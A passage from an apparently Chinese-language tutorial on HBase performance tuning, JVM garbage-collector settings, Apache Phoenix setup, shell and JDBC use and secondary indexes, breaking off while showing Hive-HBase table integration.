100ms）</span><br><span class="line">hbase.client.retries.number（默认 15 次）</span><br></pre></td></tr></table></figure><h3 id="2-2-设置-RPC-监听数量">2.2 设置 RPC 监听数量</h3><ul><li>属性：hbase.regionserver.handler.count</li><li>解释：默认值为 30，用于指定 RPC 监听的数量，可以根据客户端的请求数进行调整，读写请求较多时，增加此值。</li></ul><h3 id="2-3-手动控制-Major-Compaction">2.3 手动控制 Major Compaction</h3><ul><li>属性：hbase.hregion.majorcompaction</li><li>解释：默认值：604800000 秒（7 天）， Major Compaction 的周期，若关闭自动 Major Compaction，可将其设为 0。<strong>如果关闭一定记得自己手动合并，因为大合并非常有意义</strong></li></ul><h3 id="2-4-优化-HStore-文件大小">2.4 优化 HStore 文件大小</h3><ul><li>属性：hbase.hregion.max.filesize</li><li>解释：默认值 10737418240（10GB），如果需要运行 HBase 的 MR 任务，可以减小此值，因为一个 region 对应一个 map 任务，如果单个 region 过大，会导致 map 任务执行时间过长。该值的意思就是，如果 HFile 的大小达到这个数值，则这个 region 会被切分为两个 Hfile</li></ul><h3 id="2-5-优化-HBase-客户端缓存">2.5 优化 HBase 客户端缓存</h3><ul><li>属性：hbase.client.write.buffer</li><li>解释：默认值 2097152bytes（2M）用于指定 HBase 客户端缓存，增大该值可以减少 RPC调用次数，但是会消耗更多内存，反之则反之。一般我们需要设定一定的缓存大小，以达到减少 RPC 次数的目的。</li></ul><h3 id="2-6-指定-scan-next-扫描-HBase-所获取的行数">2.6 指定 scan.next 扫描 HBase 所获取的行数</h3><ul><li>属性：hbase.client.scanner.caching</li><li>解释：用于指定 scan.next 方法获取的默认行数，值越大，消耗内存越大</li></ul><h3 id="2-7-BlockCache-占用-RegionServer-堆内存的比例">2.7 BlockCache 占用 RegionServer 堆内存的比例</h3><ul><li>属性：hfile.block.cache.size</li><li>解释：默认 0.4，读请求比较多的情况下，可适当调大</li></ul><h3 id="2-8-MemStore-占用-RegionServer-堆内存的比例">2.8 MemStore 占用 RegionServer 堆内存的比例</h3><ul><li>属性：hbase.regionserver.global.memstore.size</li><li>解释：默认 0.4，写请求较多的情况下，可适当调大</li></ul><p><strong>Lars Hofhansl（拉斯·霍夫汉斯）推荐 Region 设置 20G，刷写大小设置 128M，其它默认</strong></p><h2 id="3、JVM-调优">3、JVM 调优</h2><p>JVM 调优的思路有两部分：一是内存设置，二是垃圾回收器设置。垃圾回收的修改是使用并发垃圾回收，默认 PO+PS 是并行垃圾回收，会有大量的暂停。理由是 HBsae 大量使用内存用于存储数据，容易遭遇数据洪峰造成 OOM，同时写缓存的数据是不能垃圾回收的，主要回收的就是读缓存，而读缓存垃圾回收不影响性能，所以最终设置的效果可以总结为：防患于未然，早洗早轻松</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置使用 CMS 收集器（并发）</span></span><br><span class="line">-XX:+UseConcMarkSweepGC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保持新生代尽量小，同时尽早开启 GC，例如</span></span><br><span class="line"><span class="comment"># 在内存占用到 70%的时候开启 GC</span></span><br><span class="line">-XX:CMSInitiatingOccupancyFraction=70</span><br><span class="line"><span class="comment"># 指定使用 70%，不让 JVM 动态调整</span></span><br><span class="line">-XX:+UseCMSInitiatingOccupancyOnly</span><br><span class="line"><span class="comment"># 新生代内存设置为 512m</span></span><br><span class="line">-Xmn512m</span><br><span class="line"><span class="comment"># 并行执行新生代垃圾回收</span></span><br><span class="line">-XX:+UseParNewGC</span><br><span class="line"><span class="comment"># 设 置 scanner 扫 描 结 果 占 用 内 存 大 小 ， 在 hbase-site.xml 中，设置</span></span><br><span class="line"><span class="comment"># hbase.client.scanner.max.result.size(默认值为 2M)为 eden 空间的 1/8（大概在 64M）</span></span><br><span class="line"><span class="comment">#  设置多个与 max.result.size * handler.count 相乘的结果小于 Survivor Space(新生代经过垃圾回收之后存活的对象)</span></span><br></pre></td></tr></table></figure><h2 id="4、HBase-使用经验法则">4、HBase 使用经验法则</h2><ul><li>Region 大小控制 10-50G</li><li>cell 大小不超过 10M（性能对应小于 100K 的值有优化），如果使用 mob（Medium-sized Objects 一种特殊用法）则不超过 50M</li><li>1 张表有 1 到 3 个列族，不要设计太多。最好就 1 个，如果使用多个尽量保证不会同时读取多个列族</li><li>1 到 2 个列族的表格，设计 50-100 个 Region</li><li>列族名称要尽量短，不要去模仿 RDBMS（关系型数据库）具有准确的名称和描述</li><li>如果 RowKey 设计时间在最前面，会导致有大量的旧数据存储在不活跃的 Region中，使用的时候，仅仅会操作少数的活动 Region，此时建议增加更多的 Region 个数</li><li>如果只有一个列族用于写入数据，分配内存资源的时候可以做出调整，即写缓存不会占用太多的内存</li></ul><h1>六、整合 Phoenix</h1><h2 id="1、Phoenix-简介">1、Phoenix 简介</h2><h3 id="1-1-Phoenix-定义">1.1 Phoenix 定义</h3><p>Phoenix 是 HBase 的开源 SQL 皮肤。可以使用标准 JDBC API 代替 HBase 客户端 API来创建表，插入数据和查询 HBase 数据。</p><h3 id="1-2-为什么使用-Phoenix">1.2 为什么使用 Phoenix</h3><p>官方给的解释为：在 Client 和 HBase 之间放一个 Phoenix 中间层不会减慢速度，因为用户编写的数据处理代码和 Phoenix 编写的没有区别（更不用说你写的垃圾的多），不仅如此Phoenix 对于用户输入的 SQL 同样会有大量的优化手段（就像 hive 自带 sql 优化器一样）。</p><p>Phoenix 在 5.0 版本默认提供有两种客户端使用（瘦客户端和胖客户端），在 5.1.2 版本安装包中删除了瘦客户端，本文也不再使用瘦客户端。而胖客户端和用户自己写 HBase 的API 代码读取数据之后进行数据处理是完全一样的</p><h2 id="2、Phoenix快速入门">2、Phoenix快速入门</h2><blockquote><p>官网：<a href="https://phoenix.apache.org/" target="_blank" rel="noopener" title="https://phoenix.apache.org/">https://phoenix.apache.org/</a></p></blockquote><h3 id="2-1-Phoenix安装部署">2.1 Phoenix安装部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">wget http://archive.apache.org/dist/phoenix/phoenix-5.1.2/phoenix-hbase-2.4-5.1.2-bin.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf phoenix-hbase-2.4-5.1.2-bin.tar.gz -C /opt/module/</span><br><span class="line">mv phoenix-hbase-2.4-5.1.2-bin/ phoenix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 server 包并拷贝到各个节点的 hbase/lib</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/phoenix/</span><br><span class="line">cp phoenix-server-hbase-2.4-5.1.2.jar /opt/module/hbase/lib/</span><br><span class="line">xsync /opt/module/hbase/lib/phoenix-server-hbase-2.4-5.1.2.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#phoenix</span></span><br><span class="line"><span class="built_in">export</span> PHOENIX_HOME=/opt/module/phoenix</span><br><span class="line"><span class="built_in">export</span> PHOENIX_CLASSPATH=<span class="variable">$PHOENIX_HOME</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$PHOENIX_HOME</span>/bin</span><br><span class="line"><span class="comment"># 刷新环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 HBase</span></span><br><span class="line">stop-hbase.sh</span><br><span class="line">start-hbase.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接 Phoenix</span></span><br><span class="line">/opt/module/phoenix/bin/sqlline.py hadoop102,hadoop103,hadoop104:2181</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误解决</span></span><br><span class="line"><span class="comment"># 出现下面错误的原因是之前使用过 phoenix，建议删除之前的记录</span></span><br><span class="line"><span class="comment"># 警告: Failed to load history</span></span><br><span class="line"><span class="comment"># java.lang.IllegalArgumentException: Bad history file syntax! The </span></span><br><span class="line"><span class="comment"># history file `/home/atguigu/.sqlline/history` may be an older </span></span><br><span class="line"><span class="comment"># history: please remove it or use a different history file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决方法：在/home/atguigu 目录下删除.sqlline 文件夹</span></span><br><span class="line">rm -rf .sqlline/</span><br></pre></td></tr></table></figure><h3 id="2-2-Phoenix-Shell-操作">2.2 Phoenix Shell 操作</h3><p><strong>table</strong></p><blockquote><p>建议查看官网：<a href="https://phoenix.apache.org/language/index.html" target="_blank" rel="noopener" title="https://phoenix.apache.org/language/index.html">https://phoenix.apache.org/language/index.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示所有表</span></span><br><span class="line">!table 或 !tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="comment"># 直接指定单个列作为 RowKey</span></span><br><span class="line">CREATE TABLE IF NOT EXISTS student(</span><br><span class="line">id VARCHAR primary key,</span><br><span class="line">name VARCHAR,</span><br><span class="line">age BIGINT,</span><br><span class="line">addr VARCHAR);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 phoenix 中，表名等会自动转换为大写，若要小写，使用双引号，如"us_population"。</span></span><br><span class="line"><span class="comment"># 指定多个列的联合作为 RowKey</span></span><br><span class="line">CREATE TABLE IF NOT EXISTS student1 (</span><br><span class="line">id VARCHAR NOT NULL,</span><br><span class="line">name VARCHAR NOT NULL,</span><br><span class="line">age BIGINT,</span><br><span class="line">addr VARCHAR</span><br><span class="line">CONSTRAINT my_pk PRIMARY KEY (id, name));</span><br><span class="line"><span class="comment"># 注：Phoenix 中建表，会在 HBase 中创建一张对应的表。为了减少数据对磁盘空间的占，Phoenix 默认会对 HBase 中的列名做编码处理。</span></span><br><span class="line"><span class="comment"># 具体规则可参考官网链接：https://phoenix.apache.org/columnencoding.html，若不想对列名编码，可在建表语句末尾加上 COLUMN_ENCODED_BYTES = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line">upsert into student values(<span class="string">'1001'</span>,<span class="string">'zhangsan'</span>, 10, <span class="string">'beijing'</span>);</span><br><span class="line"><span class="comment"># 查询记录</span></span><br><span class="line">select * from student;</span><br><span class="line">select * from student <span class="built_in">where</span> id=<span class="string">'1001'</span>;</span><br><span class="line"><span class="comment"># 删除记录</span></span><br><span class="line">delete from student <span class="built_in">where</span> id=<span class="string">'1001'</span>;</span><br><span class="line"><span class="comment"># 删除表</span></span><br><span class="line">drop table student;</span><br><span class="line"><span class="comment"># 退出命令行</span></span><br><span class="line">!quit</span><br></pre></td></tr></table></figure><p><strong>表的映射</strong></p><p>默认情况下，HBase 中已存在的表，通过 Phoenix 是不可见的。如果要在 Phoenix 中操作 HBase 中已存在的表，可以在 Phoenix 中进行表的映射。映射方式有两种：视图映射和表映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">/opt/module/hbase/bin/hbase shell</span><br><span class="line"><span class="comment"># 创建 HBase 表 test</span></span><br><span class="line">create <span class="string">'test'</span>,<span class="string">'info1'</span>,<span class="string">'info2'</span></span><br><span class="line"><span class="comment"># 视图映射</span></span><br><span class="line"><span class="comment"># Phoenix 创建的视图是只读的，所以只能用来做查询，无法通过视图对数据进行修改等操作</span></span><br><span class="line">create view <span class="string">"test"</span>(id varchar primary key,<span class="string">"info1"</span>.<span class="string">"name"</span> varchar, <span class="string">"info2"</span>.<span class="string">"address"</span> varchar);</span><br><span class="line"><span class="comment"># 删除视图</span></span><br><span class="line">drop view <span class="string">"test"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表映射</span></span><br><span class="line"><span class="comment"># 在 Pheonix 创建表去映射 HBase 中已经存在的表，是可以修改删除 HBase 中已经存在的数据的</span></span><br><span class="line"><span class="comment"># 删除 Phoenix 中的表，那么 HBase 中被映射的表也会被删除</span></span><br><span class="line"><span class="comment"># 注：进行表映射时，不能使用列名编码，需将 column_encoded_bytes 设为 0</span></span><br><span class="line">create table <span class="string">"test"</span>(id varchar primary key,<span class="string">"info1"</span>.<span class="string">"name"</span> varchar, <span class="string">"info2"</span>.<span class="string">"address"</span> varchar) column_encoded_bytes=0;</span><br></pre></td></tr></table></figure><p><strong>数字类型说明</strong></p><p>HBase 中的数字，底层存储为补码，而 Phoenix 中的数字，底层存储为在补码的基础上，将符号位反转。故当在 Phoenix 中建表去映射 HBase 中已存在的表，当 HBase 中有数字类型的字段时，会出现解析错误的现象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hbase 演示</span></span><br><span class="line">create <span class="string">'test_number'</span>,<span class="string">'info'</span></span><br><span class="line">put <span class="string">'test_number'</span>,<span class="string">'1001'</span>,<span class="string">'info:number'</span>,Bytes.toBytes(1000)</span><br><span class="line">scan <span class="string">'test_number'</span>,&#123;COLUMNS =&gt; <span class="string">'info:number:toLong'</span>&#125;</span><br><span class="line"><span class="comment"># phoenix 演示：</span></span><br><span class="line">create view <span class="string">"test_number"</span>(id varchar primary key,<span class="string">"info"</span>.<span class="string">"number"</span> bigint);</span><br><span class="line">select * from <span class="string">"test_number"</span>;</span><br></pre></td></tr></table></figure><p>解决方法：</p><p>(1)Phoenix 种提供了 unsigned_int，unsigned_long 等无符号类型，其对数字的编码解码方式和 HBase 是相同的，如果无需考虑负数，那在 Phoenix 中建表时采用无符号类型是最合适的选择</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop view <span class="string">"test_number"</span>;</span><br><span class="line">create view <span class="string">"test_number"</span>(id varchar primary key,<span class="string">"info"</span>.<span class="string">"number"</span> unsigned_long);</span><br><span class="line">select * from <span class="string">"test_number"</span>;</span><br></pre></td></tr></table></figure><p>(2)如需考虑负数的情况，则可通过 Phoenix 自定义函数，将数字类型的最高位，即符号位反转即可，自定义函数可参考如下链接：<a href="https://phoenix.apache.org/udf.html%E3%80%82" target="_blank" rel="noopener" title="https://phoenix.apache.org/udf.html">https://phoenix.apache.org/udf.html</a></p><h3 id="2-3-Phoenix-JDBC-操作">2.3 Phoenix JDBC 操作</h3><p>此处演示一个标准的 JDBC 连接操作，实际开发中会直接使用别的框架内嵌的 Phoenix 连接，胖客户端加入maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-client-hbase-2.4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhoenixClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="comment">// 标准的 JDBC 代码</span></span><br><span class="line">        <span class="comment">// 1.添加链接</span></span><br><span class="line">        String url = <span class="string">"jdbc:phoenix:hadoop102,hadoop103,hadoop104:2181"</span>;</span><br><span class="line">        <span class="comment">// 2. 创建配置</span></span><br><span class="line">        <span class="comment">// 没有需要添加的必要配置 因为 Phoenix 没有账号密码</span></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="comment">// 3. 获取连接</span></span><br><span class="line">        Connection connection = DriverManager.getConnection(url,properties);</span><br><span class="line">        <span class="comment">// 5.编译 SQL 语句</span></span><br><span class="line">        PreparedStatement preparedStatement = connection.prepareStatement(<span class="string">"select * from student"</span>);</span><br><span class="line">        <span class="comment">// 6.执行语句</span></span><br><span class="line">        ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line">        <span class="comment">// 7.输出结果</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            System.out.println(resultSet.getString(<span class="number">1</span>) + <span class="string">":"</span> +</span><br><span class="line">                    resultSet.getString(<span class="number">2</span>) + <span class="string">":"</span> + resultSet.getString(<span class="number">3</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 8.关闭资源</span></span><br><span class="line">        connection.close();</span><br><span class="line">        <span class="comment">// 由于 Phoenix 框架内部需要获取一个 HBase 连接,所以会延迟关闭</span></span><br><span class="line">        <span class="comment">// 不影响后续的代码执行</span></span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、Phoenix-二级索引">3、Phoenix 二级索引</h2><h3 id="3-1-二级索引配置文件">3.1 二级索引配置文件</h3><p>添加如下配置到 HBase 的 HRegionserver 节点的 hbase-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- phoenix regionserver 配置参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.regionserver.wal.codec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hbase.regionserver.wal.IndexedWALEditCodec<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-2-全局索引（global-index）">3.2 全局索引（global index）</h3><p>Global Index 是<strong>默认的索引格式</strong>，创建全局索引时，会在 <strong>HBase 中建立一张新表</strong>。也就是说索引数据和数据表是存放在不同的表中的，因此全局索引适用于<strong>多读少写</strong>的业务场景。</p><p>写数据的时候会消耗大量开销，因为索引表也要更新，而索引表是分布在不同的数据节点上的，跨节点的数据传输带来了较大的性能消耗。在读数据的时候 Phoenix 会选择索引表来降低查询消耗的时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建单个字段的全局索引</span></span><br><span class="line">CREATE INDEX my_index ON my_table (my_col);</span><br><span class="line"><span class="comment">#例如</span></span><br><span class="line">create index my_index on student1(age);</span><br><span class="line"><span class="comment">#删除索引</span></span><br><span class="line">DROP INDEX my_index ON my_table</span><br><span class="line">drop index my_index on student1;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看二级索引是否有效，可以使用 explainPlan 执行计划，有二级索引之后会变成范围扫描</span></span><br><span class="line">explain select id,name from student1 <span class="built_in">where</span> age = 10;</span><br><span class="line"><span class="comment"># 如果想查询的字段不是索引字段的话索引表不会被使用，也就是说不会带来查询速度的提升</span></span><br><span class="line">explain select </span><br><span class="line">id,name,addr from student1 <span class="built_in">where</span> age = 10;</span><br></pre></td></tr></table></figure><h3 id="3-3-包含索引（covered-index）">3.3 包含索引（covered index）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建携带其他字段的全局索引（本质还是全局索引）</span></span><br><span class="line">CREATE INDEX my_index ON my_table (v1) INCLUDE (v2);</span><br><span class="line"><span class="comment"># 先删除之前的索引</span></span><br><span class="line">drop index my_index on student1;</span><br><span class="line"><span class="comment"># 创建包含索引</span></span><br><span class="line">create index my_index on student1(age) include (addr);</span><br><span class="line"><span class="comment"># 之后使用执行计划查看效果，使用explain</span></span><br></pre></td></tr></table></figure><h3 id="3-4-本地索引（local-index）">3.4 本地索引（local index）</h3><p>Local Index 适用于写操作频繁的场景。索引数据和数据表的数据是存放在同一张表中（且是同一个 Region），避免了在写操作的时候往不同服务器的索引表中写索引带来的额外开销</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_column 可以是多个</span></span><br><span class="line">CREATE LOCAL INDEX my_index ON my_table (my_column);</span><br><span class="line"><span class="comment"># 本地索引会将所有的信息存在一个影子列族中，虽然读取的时候也是范围扫描，但是没有全局索引快，优点在于不用写多个表了</span></span><br><span class="line"><span class="comment">#删除之前的索引</span></span><br><span class="line">drop index my_index on student1;</span><br><span class="line"><span class="comment">#创建本地索引</span></span><br><span class="line">CREATE LOCAL INDEX my_index ON student1 (age,addr);</span><br><span class="line"><span class="comment">#使用执行计划</span></span><br><span class="line">explain select id,name,addr from student1 <span class="built_in">where</span> age = 10;</span><br></pre></td></tr></table></figure><h1>七、Hive集成</h1><h2 id="1、集成使用">1、集成使用</h2><h3 id="1-1-使用场景">1.1 使用场景</h3><p>如果大量的数据已经存放在 HBase 上面，需要对已经存在的数据进行数据分析处理，那么 Phoenix 并不适合做特别复杂的 SQL 处理，此时可以使用 hive 映射 HBase 的表格，之后写 HQL 进行分析处理。</p><h3 id="1-2-配置">1.2 配置</h3><p>在 hive-site.xml 中添加 zookeeper 的属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102,hadoop103,hadoop104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.client.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、案例举例">2、案例举例</h2><h3 id="2-1-案例一">2.1 案例一</h3><p>目标：建立 Hive 表，关联 HBase 表，插入数据到 Hive 表的同时能够影响 HBase 表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Hive 中创建表同时关联 HBase</span></span><br><span class="line">CREATE TABLE hive_hbase_emp_table(</span><br><span class="line"> empno int,</span><br><span class="line"> ename string,</span><br><span class="line"> job string,</span><br><span class="line"> mgr int,</span><br><span class="line"> hiredate string,</span><br><span class="line"> sal double,</span><br><span class="line"> comm double,</span><br><span class="line"> deptno int</span><br><span class="line">)</span><br><span class="line">STORED BY <span class="string">'org.apache.hadoop.hive.hbase.HBaseStorageHandler'</span></span><br><span class="line">WITH SERDEPROPERTIES (<span class="string">"hbase.columns.mapping"</span> = <span class="string">":key,info:ename,info:job,info:mgr,info:hiredate,info:sal,info:comm,info:deptno"</span>)</span><br><span class="line">TBLPROPERTIES (<span class="string">"hbase.table.name"</span> = <span class="string">"hbase_emp_table"</span>);</span><br><span class="line"><span class="comment"># 提示：完成之后，可以分别进入 Hive 和 HBase 查看，都生成了对应的表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># （2）在 Hive 中创建临时中间表，用于 load 文件中的数据</span></span><br><span class="line"><span class="comment"># 提示：不能将数据直接 load 进 Hive 所关联 HBase 的那张表中</span></span><br><span class="line">CREATE TABLE emp(</span><br><span class="line"> empno int,</span><br><span class="line"> ename string,</span><br><span class="line"> job string,</span><br><span class="line"> mgr int,</span><br><span class="line"> hiredate string,</span><br><span class="line"> sal double,</span><br><span class="line"> comm double,</span><br><span class="line"> deptno int</span><br><span class="line">)</span><br><span class="line">row format delimited fields terminated by <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># （3）向 Hive 中间表中 load 数据</span></span><br><span class="line">load data <span class="built_in">local</span> inpath <span class="string">'/opt/software/emp.txt'</span> into table emp;</span><br><span class="line"><span class="comment"># （4）通过 insert 命令将中间表中的数据导入到 Hive 关联 Hbase 的那张表中</span></span><br><span class="line">insert into table hive_hbase_emp_table select * from emp;</span><br><span class="line"><span 